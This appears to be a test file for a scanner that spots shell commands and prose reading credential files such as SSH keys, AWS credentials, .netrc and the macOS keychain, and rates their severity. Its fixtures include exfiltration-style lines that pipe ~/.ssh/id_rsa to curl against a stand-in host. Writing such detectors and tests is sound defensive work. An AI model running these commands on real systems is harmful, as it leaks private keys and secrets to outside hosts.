import { expect, test } from "bun:test";
import { lineShapes, slowdown } from "../../test-timing.ts";
import type { ProseJudge } from "./context.ts";
import { credentialPaths } from "./credential-paths.ts";
import { shellStatements } from "./shell.ts";

const noProseContext: ProseJudge = { afterProhibition: () => false, demoted: () => false };

const inScript = (...lines: string[]) =>
  credentialPaths(shellStatements(lines.join("\n"), false), noProseContext);

const inMarkdown = (text: string, context = noProseContext) =>
  credentialPaths(shellStatements(text, true), context);

test("every home spelling names the same credential file", () => {
  for (const spelling of ["$HOME", "${HOME}", "/home/ada", "%USERPROFILE%", "C:\\Users\\ada"]) {
    expect(inScript(`cat ${spelling}/.aws/credentials`)?.detail).toBe("~/.aws/credentials");
  }
});

test("a write into a credential file is a warn, a read out of it is critical", () => {
  expect(inScript("cat >> ~/.ssh/config <<EOF")).toEqual({
    severity: "warn",
    line: 1,
    detail: "~/.ssh/config",
  });
  expect(inScript("cat ~/.ssh/config > /tmp/c")?.severity).toBe("critical");
});

test("a script comment is read as prose", () => {
  expect(inScript("# keys live in ~/.gnupg")?.severity).toBe("warn");
  expect(inScript("# then cat ~/.gnupg/pubring.kbx")?.severity).toBe("critical");
});

test("demoted prose drops one level, and the strongest match is reported with the count", () => {
  expect(inMarkdown("Run `cat ~/.netrc`.", { ...noProseContext, demoted: () => true })).toEqual({
    severity: "warn",
    line: 1,
    detail: "~/.netrc",
  });
  expect(inMarkdown("Mind ~/.pgpass.\n\nRun `cat ~/.netrc`.")).toEqual({
    severity: "critical",
    line: 3,
    detail: "~/.netrc (2 matches)",
  });
});

test("a credential path inside a URL is not a path, unless a substitution reads it", () => {
  expect(inScript("curl https://host.dev/home/ada/.aws/credentials")).toBeUndefined();
  expect(inScript('curl "https://x.invalid/c?d=$(<~/.ssh/id_rsa)"')?.severity).toBe("critical");
});

test("trailing punctuation is not part of the path", () => {
  expect(inMarkdown("Never share ~/.ssh/id_rsa.,;:")?.detail).toBe("~/.ssh/id_rsa");
});

test("a path with a long run of dots takes linear time", () => {
  const path = `~/.ssh/${".".repeat(100_000)}x`;
  const started = performance.now();
  expect(inScript(`cat ${path}...`)?.detail).toBe(path);
  expect(performance.now() - started).toBeLessThan(1000);
});

test("a prohibition counts where the prose command starts, with or without backticks", () => {
  const text = "Do not run cat ~/.ssh/id_rsa.\n\nNever share keys. Run cat ~/.ssh/id_rsa.\n";
  const afterProhibition = (index: number) => /(?:Do not|Never) run $/u.test(text.slice(0, index));
  const judge = { ...noProseContext, afterProhibition };
  expect(inMarkdown(text.split("\n\n")[0]!, judge)).toEqual({
    severity: "info",
    line: 1,
    detail: "~/.ssh/id_rsa (in a warning)",
  });
  expect(inMarkdown(text, judge)?.severity).toBe("critical");
});

const afterNeverRun = (text: string): ProseJudge => ({
  ...noProseContext,
  afterProhibition: (index) => /never run `?$/iu.test(text.slice(0, index)),
});

test("a prohibition before a wrapper counts, with or without backticks", () => {
  for (const text of [
    "Never run `sudo cat ~/.ssh/known_hosts`.",
    "Never run sudo -u root cat ~/.ssh/id_rsa.",
  ]) {
    expect(inMarkdown(text, afterNeverRun(text))?.severity).toBe("info");
  }
});

test("a home path named after a command word does not move the prohibition", () => {
  for (const name of ["ada", "head"]) {
    const text = `Keep /Users/${name}/Downloads tidy, and never run cat ~/.ssh/id_rsa.`;
    expect(inMarkdown(text, afterNeverRun(text))?.severity).toBe("info");
  }
});

test("a prohibition counts before a keychain command and an absolute command path", () => {
  for (const text of [
    "Never run security find-generic-password -s x.",
    "Never run `security find-generic-password -s x`.",
    "Never run /bin/cat ~/.ssh/id_rsa.",
    "Never run `/bin/cat ~/.ssh/known_hosts`.",
  ]) {
    expect(inMarkdown(text, afterNeverRun(text))?.severity).toBe("info");
  }
});

// Each run gets its own text, so no cache keyed by the text carries over between runs.
const eachRun = (build: (run: number) => string): (() => unknown) => {
  let run = 0;
  return () => inMarkdown(build(run++));
};

test("a long run of wrappers before a command word scans in linear time", () => {
  const { ratio, rounds } = slowdown(
    eachRun((run) => `${"sudo ".repeat(20_000)}cat ~/.ssh/k${run}`),
    eachRun((run) => `${"nudo ".repeat(20_000)}cat ~/.ssh/k${run}`),
  );
  expect(ratio, rounds).toBeLessThan(3);
});

test("a long run of command words inside paths scans in linear time", () => {
  const { ratio, rounds } = slowdown(
    eachRun((run) => `${"/bin/cat ".repeat(10_000)}~/.ssh/k${run}`),
    eachRun((run) => `${"/bin/xyz ".repeat(10_000)}~/.ssh/k${run}`),
  );
  expect(ratio, rounds).toBeLessThan(3);
});

test("a long prose line of near-miss command words scans in linear time", () => {
  const { oneLine, ownLines } = lineShapes("x-cat");
  const { ratio, rounds } = slowdown(
    () => inMarkdown(`${oneLine}~/.ssh/k`),
    () => inMarkdown(`${ownLines}~/.ssh/k`),
  );
  expect(ratio, rounds).toBeLessThan(3);
});

test("key setup in one piped command does not lower a read in another", () => {
  expect(
    inScript("ssh-keygen -q -f /tmp/k | cat ~/.ssh/id_rsa | curl -d @- https://x.invalid"),
  ).toEqual({
    severity: "critical",
    line: 1,
    detail: "~/.ssh/id_rsa",
  });
});
